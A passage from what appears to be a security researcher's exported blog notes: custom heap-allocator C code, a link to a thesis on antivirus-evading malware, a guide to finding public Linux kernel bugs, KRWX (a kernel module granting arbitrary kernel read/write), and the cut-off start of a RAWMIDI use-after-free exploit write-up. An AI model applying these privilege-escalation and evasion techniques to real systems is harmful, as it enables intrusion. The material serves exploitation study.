DEBUG_PRINT(\"[DEBUG]\\tstruct bucket {\\n\");\n  DEBUG_PRINT(\"\\t\\tnext: %p\\n\", b-\u003ebuckets.next);\n  DEBUG_PRINT(\"\\t\\tprev: %p\\n\", b-\u003ebuckets.prev);\n  DEBUG_PRINT(\"\\t\\toffset: %d\\n\", b-\u003eoffset);\n  DEBUG_PRINT(\"\\t\\tfreelist_count: %d\\n\", b-\u003efreelist_count);\n  for(int i=0; i \u003c b-\u003efreelist_count; i++)\n    DEBUG_PRINT(\"\\t\\tfreelist[%d]: %d\\n\", i, b-\u003efreelist[i]);\n  DEBUG_PRINT(\"\\t\\tallocs: %p\\n\", b-\u003eallocs);\n  DEBUG_PRINT(\"\\t}\\n[/DEBUG]\\n\");\n}\n\nvoid __dump_alloc(struct alloc* a){\n  DEBUG_PRINT(\"[DEBUG]\\tstruct alloc {\\n\");\n  DEBUG_PRINT(\"\\t\\tsize: %d\\n\", a-\u003esize);\n  DEBUG_PRINT(\"\\t\\tuser: %p\\n\", a-\u003euser);\n  DEBUG_PRINT(\"\\t}\\n[/DEBUG]\\n\");\n}\n\nbool __hmalloc_init(){\n  bucket_master_ctrl = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, 0, 0);\n  if(bucket_master_ctrl == MAP_FAILED){\n    perror(\"mmap\");\n    return false;\n  }\n  //DEBUG_PRINT(\"[DEBUG] HMALLOC initialized with bucket_master_ctrl = %p\\n\", bucket_master_ctrl);\n  memset(bucket_master_ctrl, 0x0, PAGE_SZ);\n  return true;\n}\n\nstruct bucket* __init_bucket(size_t size){\n  struct bucket* bucket;\n  DEBUG_PRINT(\"Initializing small bucket with %d pages\\n\", SMALL_BUCKET_PAGES);\n  bucket = mmap(NULL, PAGE_SZ * SMALL_BUCKET_PAGES, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, 0, 0);\n  memset(bucket, 0x0, PAGE_SZ * SMALL_BUCKET_PAGES);\n  return bucket;\n}\n\nsize_t __bucket_max_allocations(size_t alloc_size){\n  return ((PAGE_SZ * SMALL_BUCKET_PAGES) - sizeof(struct bucket)) / alloc_size;\n}\n\nstruct bucket* __get_bucket(size_t alloc_size){\n  off_t off = alloc_size - sizeof(void*);\n  return *(void**)((void*) bucket_master_ctrl + off);\n}\n\nstruct bucket* __get_bucket_from_alloc(struct alloc* target_alloc){\n  return (struct bucket*) ((uint64_t) target_alloc \u0026 SMALL_BUCKET_MASK);\n}\n\nstatic inline void __update_master_ctrl_bucket(size_t alloc_size, struct bucket* bck){\n  off_t off = alloc_size - sizeof(void*);\n  *(void**) ((void*) bucket_master_ctrl + off) = bck;\n}\n\nvoid* __fastpath_new_bucket_alloc(struct bucket* b, size_t alloc_size){\n  // return the pointer to the first allocation of a newly allocated bucket\n  struct alloc* alloc = (struct alloc*) b-\u003eallocs;\n  alloc-\u003esize = alloc_size;\n  b-\u003eoffset++;\n  return alloc-\u003euser;\n}\n\nbool __is_freelist_available(){\n#ifdef FREELIST_QUARANTINE\n  if((time(NULL) - freelist_quarantine_time) \u003c FREELIST_QUARANTINE_WAIT){\n    return false;\n  }\n  return true;\n#endif\n  return true;\n}\n\nvoid* malloc(size_t size){\n  void* alloc;\n  if(!bucket_master_ctrl){\n    if(!__hmalloc_init())\n      return NULL;\n  }\n  alloc = __malloc(size);\n  DEBUG_PRINT(\"malloc(%zu) = %p\\n\", size, alloc);\n  return alloc;\n}\n\nvoid* __malloc(size_t input_size){\n  size_t  alloc_size;\n  off_t   bucket_offset;\n  off_t   offset;\n  struct bucket* current_bucket;\n  struct bucket* old_current_bucket;\n  struct bucket* linked_bucket;\n  struct alloc* alloc;\n  uint8_t freelist_count = 0;\n  size_t  bucket_max_allocs = 0;\n\n  /* Size validation */\n  if(input_size == 0)\n    return NULL;\n\n  DEBUG_PRINT(\"\\n+++++++++ MALLOC +++++++++\\n\");\n  alloc_size = __round_up_size(input_size + sizeof(struct alloc));\n  if(alloc_size \u003e SMALL_BUCKET_MAX_SZ){\n    /* TODO: Not implemented */\n    return NULL;\n  }\n\n  /* Retrieve, or initialize, the appropriate bucket based on alloc_size */\n  current_bucket = __get_bucket(alloc_size);\n  /* If the  bucket is not initialized, do it */\n  if(current_bucket == NULL){\n    current_bucket = __init_bucket(alloc_size);\n    if(current_bucket == NULL){\n      perror(\"__init_bucket: mmap\");\n      return NULL;\n    }\n    DEBUG_PRINT(\"[DEBUG] Bucket %zu initialized: %p\\n\", alloc_size, current_bucket);\n    // Store the bucket inside the Bucket Master Control\n    __update_master_ctrl_bucket(alloc_size, current_bucket);\n  }\n  DEBUG_PRINT(\"[DEBUG] current_bucket (%zu) = %p\\n\", alloc_size, current_bucket);\n  __dump_bucket(current_bucket);\n\n  /* 1. Verify if we have freed allocs inside the current_bucket */\n  freelist_count = current_bucket-\u003efreelist_count;\n  if(freelist_count \u0026\u0026 __is_freelist_available()){\n    offset = current_bucket-\u003efreelist[(current_bucket-\u003efreelist_count - 1)];\n    alloc = (void*) current_bucket-\u003eallocs + ( offset * alloc_size);\n    current_bucket-\u003efreelist_count--;\n    DEBUG_PRINT(\"[DEBUG] Alloc retrieved from the freelist with offset %ld: %p\\n\", offset, alloc);\n    return alloc-\u003euser;\n  }\n\n  /* 2. Verify if we can alloc from the current bucket */\n  bucket_max_allocs = __bucket_max_allocations(alloc_size);\n  bucket_offset = current_bucket-\u003eoffset;\n  if(bucket_offset != bucket_max_allocs){\n    // We still have allocs to return!\n    if(bucket_offset \u003e bucket_max_allocs){\n      DEBUG_PRINT(\"!! bucket_offset should never exceeds its maximum allocations!\\n\");\n      return NULL;\n    }\n    alloc = (struct alloc*) ((void*) current_bucket-\u003eallocs + (bucket_offset * alloc_size));\n    alloc-\u003esize = alloc_size;\n    current_bucket-\u003eoffset++;\n    __dump_alloc(alloc);\n    return alloc-\u003euser;\n  }\n\n  // From now on, bucket_offset == bucket_max_allocs (e.g. bucket is full)\n  /* 3. If we have linked buckets, verify them as well */\n  // Traverse backwards first\n  if(current_bucket-\u003ebuckets.prev){\n    linked_bucket = (struct bucket*) current_bucket-\u003ebuckets.prev;\n    while(linked_bucket != NULL){\n      // Traverse\n      DEBUG_PRINT(\"[DEBUG] linked bucket %p\\n\", linked_bucket);\n      __dump_bucket(linked_bucket);\n\n      if(linked_bucket-\u003efreelist_count == 0){\n        linked_bucket = (struct bucket*) linked_bucket-\u003ebuckets.prev;\n        continue;\n      }\n      \n      // If here we have a freed alloc\n      offset = linked_bucket-\u003efreelist[(linked_bucket-\u003efreelist_count - 1)];\n      alloc = (void*) linked_bucket-\u003eallocs + ( offset * alloc_size);\n      linked_bucket-\u003efreelist_count--;\n\n      // Verify if this bucket has enough freed allocs to replace the current bucket\n      if(linked_bucket-\u003efreelist_count \u003e= FREELIST_REPLACE_BUCKET_THRESHOLD){\n        __update_master_ctrl_bucket(alloc_size, linked_bucket);\n      }\n      // Return the alloation directly from here\n      DEBUG_PRINT(\"[DEBUG] Returing alloc %p from bucket %p with traversing\\n\", alloc, linked_bucket);\n      return alloc-\u003euser;\n    }\n  }\n\n  // Traverse forward\n  if(current_bucket-\u003ebuckets.next){\n    linked_bucket = (struct bucket*) current_bucket-\u003ebuckets.next;\n    while(linked_bucket != NULL){\n      // Traverse\n      DEBUG_PRINT(\"[DEBUG] linked bucket %p\\n\", linked_bucket);\n      __dump_bucket(linked_bucket);\n\n      if(linked_bucket-\u003efreelist_count == 0){\n        linked_bucket = (struct bucket*) linked_bucket-\u003ebuckets.next;\n        continue;\n      }\n      \n      // If here we have a freed alloc\n      offset = linked_bucket-\u003efreelist[(linked_bucket-\u003efreelist_count - 1)];\n      alloc = (void*) linked_bucket-\u003eallocs + ( offset * alloc_size);\n      linked_bucket-\u003efreelist_count--;\n\n      // Verify if this bucket has enough freed allocs to replace the current bucket\n      if(linked_bucket-\u003efreelist_count \u003e= FREELIST_REPLACE_BUCKET_THRESHOLD){\n        DEBUG_PRINT(\"[DEBUG] Master bucket updated with %p\\n\", linked_bucket);\n        __update_master_ctrl_bucket(alloc_size, linked_bucket);\n      }\n      // Return the alloation directly from here\n      DEBUG_PRINT(\"[DEBUG] Returing alloc %p from bucket %p with traversing\\n\", alloc, linked_bucket);\n      return alloc-\u003euser;\n    }\n  }\n\n  /* 4. If everything fails, allocate a new bucket */\n  old_current_bucket = current_bucket;\n  current_bucket = __init_bucket(alloc_size);\n  if(current_bucket == NULL){\n      perror(\"__init_bucket: mmap\");\n      return NULL;\n  }\n  DEBUG_PRINT(\"[DEBUG] New bucket %zu initialized: %p\\n\", alloc_size, current_bucket);\n\n  // update list_heads\n  old_current_bucket-\u003ebuckets.next = (struct list_head*) \u0026current_bucket-\u003ebuckets.next;\n  current_bucket-\u003ebuckets.prev = (struct list_head*) \u0026old_current_bucket-\u003ebuckets.next;\n\n  // Update the Bucket Master Control with the new bucket\n  __update_master_ctrl_bucket(alloc_size, current_bucket);\n\n  alloc = __fastpath_new_bucket_alloc(current_bucket, alloc_size);\n  __dump_alloc(alloc);\n  __dump_bucket(current_bucket);\n  return alloc;\n}\n\nvoid free(void* ptr){ \n  struct alloc* current_alloc;\n  struct bucket* current_bucket;\n  uint16_t offset;\n\n  if(ptr == NULL){ return; }\n  DEBUG_PRINT(\"\\n+++++++++ FREE +++++++++\\n\");\n\n  /* 1. Retrieve the bucket based on the size */\n  current_alloc = ptr - sizeof(struct alloc);\n  DEBUG_PRINT(\"[DEBUG] Freeing alloc %p\\n\", current_alloc);\n\n  if(current_alloc-\u003esize \u003e SMALL_BUCKET_MAX_SZ) {\n    // Should never be here since we still don't deal with that sizes\n    return;\n  }\n\n  current_bucket = __get_bucket_from_alloc(current_alloc);\n  DEBUG_PRINT(\"[DEBUG] Retrieved current bucket for %d is: %p\\n\", current_alloc-\u003esize, current_bucket);\n\n  /* 2. Update the bucket freelist count and freelist array */\n  offset = ( (void*) current_alloc - (void*) current_bucket-\u003eallocs ) / current_alloc-\u003esize;\n  current_bucket-\u003efreelist[current_bucket-\u003efreelist_count] = offset;\n  current_bucket-\u003efreelist_count++;\n  freelist_quarantine_time = time(NULL);\n  __dump_bucket(current_bucket);\n}\n```","lastmodified":"2025-04-14T13:32:05.60308601Z","tags":null},"/notes/How-To-Write-FUD-Malware-Thesis":{"title":"How to Write FUD Malware [Thesis]","content":"\nI wrote this thesis in the last high school year (2017), it was my introduction to the low-level world that quickly turned into the exploitation part of it.\nBtw it's about malware development on Windows environments with the discovery of some FUD techniques that could bypass some Antivirus defenses (at the time of writing).\n\n[How To Write FUD Malware (Thesis)](https://1day.dev/notes/images/fud/fud_thesis.pdf)\n\nIf you fear PDF 0days, check it out from [exploit-db](https://www.exploit-db.com/docs/42206) (the [english](https://www.exploit-db.com/docs/english/42250-how-to-write-fully-undetectable-malware---english-translation.pdf) version has not been translated by me).","lastmodified":"2025-04-14T13:32:05.60308601Z","tags":null},"/notes/Hunting-for-Linux-kernel-public-vulnerabilities":{"title":"Hunting for Linux kernel public vulnerabilities","content":"\n\n## Introduction\nRecently was looking for a vulnerability that permitted me to practise what I've learned during the last few months on Linux Kernel Exploitation with a \"real-life\" scenario. Since I had a week to dedicate my time in Hacktive Security to deepen a specific argument, I decided to search for a public vulnerability without a public exploit to develop it by myself. The next blog post will be related to the development of that 1day, this one is a quick post about how I discovered and choose the vulnerability using online sources, since I didn't found anything similar online.\n\n## TL;DR\nThis blog post is about public resourses to identify known vulnerabilities in the Linux Kernel in order to practise some Kernel Exploitation in a real-life scenario. These resources includes: BugZilla, SyzBot, changelogs and git logs.\n\n## Public bugs\nThe first thing I asked myself was: how do I find a suitable bug for my purpose? I excluded searching it by CVE since not all vulnerabilities have an assigned CVE (and usually they are the most \"famous\" ones) and that's when I used the most powerful hacking skill: googling. That led me to various resources that I would like to share today starting by saying that that's only the result of my personal work that could not reflect the best way to perform the same job. That said, this is what I've used to find my \"matched\" Nday:\n\n-   Bugzilla\n-   SyzBot\n-   Changelogs\n-   Git log\n\nKernel changelogs is definitely my favourite one but let's say few words on all of them.\n\n### BugZilla\n[BugZilla](https://bugzilla.kernel.org/) is the standard way to [report bugs](https://www.kernel.org/doc/html/v4.19/admin-guide/reporting-bugs.html) in the upstream Linux kernels. You can find interesting vulnerabilities organised by subsystem (e.g. Networking with IPv4 and IPv6 or file system with ext* types and so on) and you can also search for keywords (such as \"overflow\", \"heap\", \"UAF\" and so on ..) using the standard search or the more advanced one. The personal downside is the mix of a lot of \"non vulnerabilities\", hangs and stuff like that. Also, you do not have the most powerful search options (e.g. some bash). However, it is still a good option and I personally pinned few vulnerabilities that i excluded afterwards.\n\n### Syzbot\n\"syzbot is a continuous fuzzing/reporting system based on syzkaller fuzzer\" [source](https://lwn.net/Articles/749910/).  \nNot the best GUI but at least you can have a lot of potentially open and fixed vulnerabilties. There isn't a built-in search option but you can use your browser's one or parse the HTML with an HTML parser. One of the downside, beyond the lack of searching, is the presence of tons of false-positives (in the \"Open section\"). However, upsides are pretty good: you can find open vulnerabilites (still not fixed), reproducers (C or syzlang), fixed commits and reported issues have the syzkaller nomenclature that is pretty self-explainationary.\n\n#### Syzkaller-bugs (Google Group)\nThe lack of a search functionality in syz-bot is well replaced by the [\"syzkaller-bugs\" Google Group](https://groups.google.com/g/syzkaller-bugs/) from where you can find syz-bot reported bugs with additional information from the comment section and an enanched search bar. I really enjoy this option !\n\n### Changelogs\nThat's my favourite method: download all changelogs from the [kernel CDN](https://cdn.kernel.org/pub/linux/kernel/VERSION/) of your desired kernel version and you can enjoy all downloaded files with your favourite bash commands. This approach is similar to search from git commits but with the advantage that it is way faster. With some bash-fu, you can download all changelogs for a target kernel version (e.g. 4.x) with the following inline: `URL=https://cdn.kernel.org/pub/linux/kernel/v4.x/ \u0026\u0026 curl $URL | grep \"ChangeLog-4.9\" | grep -v '.sign' | cut -d \"\\\"\" -f 2 | while read line; do wget \"$URL/$line\"; done`.  \nOnce all changelogs have been downloaded it's possible to `grep` for juicy keywoards like UAF, OOB, overflow and so on. I found very useful to display text before and after the selected keyword, like: `grep -A5 -B5 UAF *`. In that way, you can instantly have quick information about vulnerability details, impacted subsystem, limitations, ..  \nFor each identified vulnerability, it's possible to see its patch by diffing the patch commit with the previous one (linux source from git is needed): `git diff \u003ccommit before\u003e \u003ccommit patch\u003e`.\n\n### Git log\nAs said before, this is a similar approach to the \"Changelogs\" method. The concept is pretty simple: clone the github repository and search for juicy keywoards in the commit history. You can do that with the following commands:\n\n```bash\ngit clone git://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git\ncd linux-stable\ngit checkout -f \u003cTAG -\u003e # e.g. git checkout -f v4.9.316 (from https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git)\ngit log \u003e ../git.log\n```\n\nIn that way, you can do the same thing as before on `git.log` file. The big downside, however, is that the file is too big and it takes more time (11.429.573 lines on 4.9.316). That's the reason why I prefer the \"Changelog\" method.\n\n## Personal Experience\nI was searching for an Use-After-Free vulnerability and I started to search for it in all mentioned resources: BugZilla, SyzBot, Changelogs and git history. I wrote them down in a table with a resume description in order to further analyze them later on. I started to dig into few of them viewing their patch and source code in order to understand reachability, compile dependencies and exploitability. I strumbled into an interesting one: a vulnerability in the RAWMIDI interface (commit c13f1463d84b86bedb664e509838bef37e6ea317). I discovered it with the \"Changelog\" method, by searching for the \"UAF\" keyword reading the previous and next five lines: `grep -A5 -B5 UAF *`. By seeing its behaviours, I was convinced to go with that vulnerability, an Use-After-Free triggered in a race condition.\n\n## Conclusion\nI illustrated my experience on finding a public vulnerability to practise some linux kernel exploitation using public resources. The next blog post will be about the mentioned vulnerability in the RAWMIDI interface with all steps involved in the exploitation phase.\n\n## References\n- https://bugzilla.kernel.org/  \n- https://www.kernel.org/doc/html/v4.19/admin-guide/reporting-bugs.html  \n- https://lwn.net/Articles/749910/  \n- https://groups.google.com/g/syzkaller-bugs/  \n- https://cdn.kernel.org/pub/linux/kernel/VERSION/\n","lastmodified":"2025-04-14T13:32:05.60308601Z","tags":null},"/notes/KRWX-Kernel-Read-Write-Execute":{"title":"KRWX: Kernel Read Write Execute","content":"\n## Introduction\ngithub project: https://github.com/kiks7/KRWX\n\nDuring the last few months/year I was studying and approaching the Kernel Exploitation subject and during this journey I developed few tools that assissted me (and currently assist) on better understanding specific topics. Today I want to release my favourine one: KRWX (**K**ernel **R**ead **W**rite **E**xecute). It is a simple LKM (Linux Kernel Module) that lets you play with kernel memory, allocate and free kernel objects directly from user-land!\n\n## What\nThe main goal of this tool is to use kernel functions from userland (from C code) in order to avoid slower kernel debugging and developing of kernel modules to demostrate specific vulnerabilities (instead, you can emulate them with provided IOCTLs). Also, it can assist the exploitation phase.\nThese are the project main features (all these features are accessible from a low level user from user-land):\n- Read and write into kernel memory\n- Read entire blocks of memory\n- Arbitrary allocate objects directly calling `kmalloc`\n- Arbitrary `kfree` objects (and also free arbitrary addresses, if you want)\n- Allocate/free multiple objects\n- Log every `copy_[from|to]_user`/ `kmalloc`/`kfree` called by the KRWX module through hooking (readable from `dmesg`).\n\nMainly, a more powerful read and write primitive :]\n\n## Why\nInitially I was writing this module to study the SLUB memory allocator in Linux by allocating, freeing and re-allocating arbitrary chunks easily from an userland process. That automatically leads to study also some exploitation techniques that, with this module, I found a lot easier to understand since you can easily play with kernel memory as you are the god of your system. Then I started to heavily use it for multiple purposes and that's the reason why I'm sharing it.\n\n## How\nThese are some exported functions:\n- `void* kmalloc(size_t arg_size, gfp_t flags)` -\u003e Allocate a chunk with specific `size` and `flag` options.\n-  `int kfree(void* address)` -\u003e Free arbitrary chunks by their `address` (also, you can free arbitrary memory).\n- `unsigned long int kread64(void* address)` -\u003e Read 8 bytes of memory at `address`.\n- `int kwrite64(void* address, uint64_t value)` -\u003e Write 8 bytes specified by `value` into `address`.\n- `void read_memory(void* start_address, size_t size)` -\u003e Read `size` amount of memory starting from `start_address`.\n\nAnd, since one of my favourite hobby is overengineer and I'm lazy enough to do not want to write loops everytime:\n- `void multiple_kmalloc(void** array, uint32_t n_objs, uint32_t size)` -\u003e Allocate `n_objs` number of objects with specified `size` and return addresses in `array`.\n- `void multiple_kfree(void** array, uint64_t to_free[], uint64_t to_free_size)` -\u003e Free specified addresses in `to_free` from `array` (`to_free_size` is the size of the `to_free` array).\n\n If you're interested in the source code feel free to check out the github project.\n\n## Examples\n### Allocate, free and read arbitrary chunks\nYou can find the full source code in `example/01.c`. Here will follows some snippets and a little walkthrough.\n\nFirst, include the external library and call its initialization function (`init_krwx`):\n```C\n#include \"./lib/krwx.h\"\n\nint main(){\n\tinit_krwx();\n\t[..]\n}\n\t\n```\nSo, 10 chunks with size 256 are allocated using `multiple_kmalloc`, and the memory of the 7th allocation is read using `read_memory` after writing `0x4141414141414141` at its first bytes:\n```C\nvoid* chunks[10];\nmultiple_kmalloc(\u0026chunks, 10, 256);\nkwrite64(chunks[7], 0x4141414141414141);\nread_memory(chunks[7], 0x10);\n```\n\nThe indexes 3, 4 and 7 of the `chunks` array are freed using `multiple_kfree`:\n```C\nuint64_t to_free[] = {3, 4, 7};\nmultiple_kfree(\u0026chunks, \u0026to_free, ( sizeof(to_free) / sizeof(uint64_t) ) );\n```\n\nOnce they are freed, new chunks with the same size are allocated and initialized with `0x4343434343434343`, and the memory of the 7h freed chunk is displayed using `read_memory` again:\n```C\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nkwrite64(kmalloc(256, _GFP_KERN), 0x4343434343434343);\nread_memory(chunks[7], 0x10);\n\n```\n\nThe result is:\n```bash\n[*] Allocating 10 chunks with size 256\n[*] Allocated @0xffffffc00503b900\n[*] Allocated @0xffffffc00503b600\n[*] Allocated @0xffffffc00503b100\n[*] Allocated @0xffffffc00503bc00\n[*] Allocated @0xffffffc00503b400\n[*] Allocated @0xffffffc00503b000\n[*] Allocated @0xffffffc00503b500\n[*] Allocated @0xffffffc00503b800\n[*] Allocated @0xffffffc00503ba00\n[*] Allocated @0xffffffc00503bd00\n0xffffffc00503b800:     0x4141414141414141 0xffffffc0001a8928\n[*] Freeing @0xffffffc00503bc00\n[*] Freeing @0xffffffc00503b400\n[*] Freeing @0xffffffc00503b800\n0xffffffc00503b800:     0x4343434343434343 0xffffffc0001a8928\n```\n\nWith  few lines of code has been demostrated how  our 7th chunk has been replaced with a new one after it has been freed (the `read_memory` targeted the `chunks[7]`). \nAs simple as it is, it has been written for demonstration purposes.\n\n### Use-After-Free\nTo simulate a UAF scenario it's simple as few lines of code:\n```C\nvoid* chunk = kmalloc(\u003cSIZE\u003e, \u003cFLAGS\u003e);\nkfree(chunk);\n// Allocate your target chunk\n// Simulate UAF using k[write|read]64()\n```\n\nFor example, if we want to simulate an attack scenario where we want to replace our vulnerable freed chunk with a target object (for example an `iovec` struct) we can allocate a chunk with `kmalloc` and later  `kfree` it just before allocating the target structure:\n```C\n// Allocate the vulnerable object\nvoid* chunk = kmalloc(150, _GFP_KERN);\n// Allocate target object\nstruct iovec iov[10] = {0};\nchar iov_buf[0x100];\niov[0].iov_base = iov_buf;\niov[0].iov_len = 0x1000;\niov[1].iov_base = iov_buf;\niov[1].iov_len = 0x1337;\nint pp[2];\npipe(pp);\nif(!fork()){\n\tkfree(chunk); // Freeing the chunk just before allocating the iovec\n\treadv(pp[0], iov, 10); // allocate iovec and blocks (keeping the object in the kernel) \n\texit(0);\n}\nsleep(1); // Give time to the child process\nread_memory(chunk, 0x40);\n\n\n```\n\nThen, with `read_memory` we can show the block of memory in our interest and as you can see from the following output, our arbitrary allocated/freed object has been replaced with the target object: \n```C\nAllocated chunk @0xffffffc0052c5a00\n0xffffffc0052c5a00:     0x0000007fd311ff58 0x0000000000001000\n0xffffffc0052c5a10:     0x0000007fd311ff58 0x0000000000001337\n0xffffffc0052c5a20:     0x0000000000000000 0x0000000000000000\n0xffffffc0052c5a30:     0x0000000000000000 0x0000000000000000\n```\n\nInstead of just print the content, you can simulate a UAF read/write using `k[read|write]` and play with it.\n\nThe full code of this example can be found in `client/example/02.c`\n\n## Setup\nTo compile the module change the `K` variable in the `Makefile` with your compiled kernel root directory and compile with `make`, then `insmod`.\n\n## Conclusions\nPersonally, I used it to study the SLUB allocator, understand UAF/Heap Overflows/Double Free/userfaultd and some hardening features in the kernel, but it can assist the exploitation phase too or more. Blog posts on some Kernel vulnerabilities and their attack methodologies will follow these months and this module will come useful to demonstrate them. So, stay tuned and enjoy !\n\nPS. The \"Execute\" part of the name will be a future implementation to control `pc/rip`.","lastmodified":"2025-04-14T13:32:05.60308601Z","tags":null},"/notes/Linux-Kernel-n-day-exploit-development-CVE-2020-27786":{"title":"Linux Kernel n-day exploit development","content":"## Introduction\nIn the previous article ([[Hunting for Linux kernel public vulnerabilities]]) I described how I identified a good candidate vulnerability using public resources to practise some exploitation techiques. In this blog post I will detail the exploitation phase of a race condition that leads to an Use-After-Free in Linux kernel 4.9.223.\n## TL;DR\nThe vulnerability is a Race Condition that causes a write Use-After-Free. The race window has been extended using the userfaultd technique handling page faults from user-space and using `msg_msg` to leak a kernel address and I/O vectors to obtain a write primitive. With the write primitive, the `modprobe_path` global  variable has been overwritten and a root shell popped.\n\n## RAWMIDI interface\nBefore facing the vulnerability, let's see few important things needed to follow this write-up. The vulnerable driver is exposed as a character device in `/dev/snd/midiC0D*` (or similar name based on the platform) and depends on [CONFIG_SND_RAWMIDI](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/Kconfig#L21). It exposes the following file operations:\n```C\n// https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L1507\nstatic const struct file_operations snd_rawmidi_f_ops =\n{\n\t.owner =\tTHIS_MODULE,\n\t.read =\t\tsnd_rawmidi_read,\n\t.write =\tsnd_rawmidi_write,\n\t.open =\t\tsnd_rawmidi_open,\n\t.release =\tsnd_rawmidi_release,\n\t.llseek =\tno_llseek,\n\t.poll =\t\tsnd_rawmidi_poll,\n\t.unlocked_ioctl =\tsnd_rawmidi_ioctl,\n\t.compat_ioctl =\tsnd_rawmidi_ioctl_compat,\n};\n```\n\nThe ones we are interesed into are `open`, `write` and `unlocked_ioctl`.\n\n### open\nThe open ([snd_rawmidi_open](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L374)) operation allocates everything needed to interact with the device, but what is just necessary to know for us is the first allocation of `snd_rawmidi_runtime-\u003ebuffer` as `GFP_KERNEL` with a size of 4096 (PAGE_SIZE) bytes. This is the [snd_rawmidi_runtime](https://elixir.bootlin.com/linux/v4.9.223/source/include/sound/rawmidi.h#L67) struct:\n```C\nstruct snd_rawmidi_runtime {\n\tstruct snd_rawmidi_substream *substream;\n\tunsigned int drain: 1,\t/* drain stage */\n\t\t     oss: 1;\t/* OSS compatible mode */\n\t/* midi stream buffer */\n\tunsigned char *buffer;\t/* buffer for MIDI data */\n\tsize_t buffer_size;\t/* size of buffer */\n\tsize_t appl_ptr;\t/* application pointer */\n\tsize_t hw_ptr;\t\t/* hardware pointer */\n\tsize_t avail_min;\t/* min avail for wakeup */\n\tsize_t avail;\t\t/* max used buffer for wakeup */\n\tsize_t xruns;\t\t/* over/underruns counter */\n\t/* misc */\n\tspinlock_t lock;\n\twait_queue_head_t sleep;\n\t/* event handler (new bytes, input only) */\n\tvoid (*event)(struct snd_rawmidi_substream *substream);\n\t/* defers calls to event [input] or ops-\u003etrigger [output] */\n\tstruct work_struct event_work;\n\t/* private data */\n\tvoid *private_data;\n\tvoid (*private_free)(struct snd_rawmidi_substream *substream);\n};\n```\n\n### write\nAfter having allocated everything from the `open` operation, we can write into the file descriptor like `write(fd, \u0026buf, 10)`. In that way, it will fill 10 bytes into the `snd_rawmidi_runtime-\u003ebuffer` and using `snd_rawmidi_runtime-\u003eappl_ptr` it will remember the offset to start writing again later.\nIn order to write into that buffer, the driver does the following calls: [snd_rawmidi_write](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1309) =\u003e [snd_rawmidi_kernel_write1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242) =\u003e `copy_from_user`\n\n\n### ioctl\nThe [snd_rawmidi_ioctl](https://elixir.bootlin.com/linux/v4.9.223/C/ident/snd_rawmidi_ioctl) is responsible to handle IOCTL commands and the one we are interested in is `SNDRV_RAWMIDI_IOCTL_PARAMS` that calls [snd_rawmidi_output_params](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L637) with user-controllable parameter:\n```C\nint snd_rawmidi_output_params(struct snd_rawmidi_substream *substream,\n\t\t\t      struct snd_rawmidi_params * params)\n{\n\t// [..] few checks\n\tif (params-\u003ebuffer_size != runtime-\u003ebuffer_size) {\n\t\tnewbuf = kmalloc(params-\u003ebuffer_size, GFP_KERNEL); //[1]\n\t\tif (!newbuf)\n\t\t\treturn -ENOMEM;\n\t\tspin_lock_irq(\u0026runtime-\u003elock);\n\t\toldbuf = runtime-\u003ebuffer;\n\t\truntime-\u003ebuffer = newbuf; // [2]\n\t\truntime-\u003ebuffer_size = params-\u003ebuffer_size;\n\t\truntime-\u003eavail = runtime-\u003ebuffer_size;\n\t\truntime-\u003eappl_ptr = runtime-\u003ehw_ptr = 0;\n\t\tspin_unlock_irq(\u0026runtime-\u003elock);\n\t\tkfree(oldbuf); //[3]\n\t}\n\t// [..]\n}\n```\n\nThis IOCTL is crucial for this vulnerability. With this command it's possible to re-size the internal buffer with an arbitrary value reallocating it[1] and later replace that buffer with the older one [2], that will be freed[3].\n\n## Vulnerability Analysis\nThe vulnerability has been patched by the commit \"c13f1463d84b86bedb664e509838bef37e6ea317\" that introduced a reference counter on the targeted vulnerable buffer. In order to understand where the vulnerbility lived it's a good thing to see its patch:\n```diff\ndiff --git a/include/sound/rawmidi.h b/include/sound/rawmidi.h\nindex 5432111c8761..2a87128b3075 100644\n--- a/include/sound/rawmidi.h\n+++ b/include/sound/rawmidi.h\n@@ -76,6 +76,7 @@ struct snd_rawmidi_runtime {\n        size_t avail_min;       /* min avail for wakeup */\n        size_t avail;           /* max used buffer for wakeup */\n        size_t xruns;           /* over/underruns counter */\n+       int buffer_ref;         /* buffer reference count */\n        /* misc */\n        spinlock_t lock;\n        wait_queue_head_t sleep;\ndiff --git a/sound/core/rawmidi.c b/sound/core/rawmidi.c\nindex 358b6efbd6aa..481c1ad1db57 100644\n--- a/sound/core/rawmidi.c\n+++ b/sound/core/rawmidi.c\n@@ -108,6 +108,17 @@ static void snd_rawmidi_input_event_work(struct work_struct *work)\n                runtime-\u003eevent(runtime-\u003esubstream);\n }\n \n+/* buffer refcount management: call with runtime-\u003elock held */\n+static inline void snd_rawmidi_buffer_ref(struct snd_rawmidi_runtime *runtime)\n+{\n+       runtime-\u003ebuffer_ref++;\n+}\n+\n+static inline void snd_rawmidi_buffer_unref(struct snd_rawmidi_runtime *runtime)\n+{\n+       runtime-\u003ebuffer_ref--;\n+}\n+\n static int snd_rawmidi_runtime_create(struct snd_rawmidi_substream *substream)\n {\n        struct snd_rawmidi_runtime *runtime;\n@@ -654,6 +665,11 @@ int snd_rawmidi_output_params(struct snd_rawmidi_substream *substream,\n                if (!newbuf)\n                        return -ENOMEM;\n                spin_lock_irq(\u0026runtime-\u003elock);\n+               if (runtime-\u003ebuffer_ref) {\n+                       spin_unlock_irq(\u0026runtime-\u003elock);\n+                       kfree(newbuf);\n+                       return -EBUSY;\n+               }\n                oldbuf = runtime-\u003ebuffer;\n                runtime-\u003ebuffer = newbuf;\n                runtime-\u003ebuffer_size = 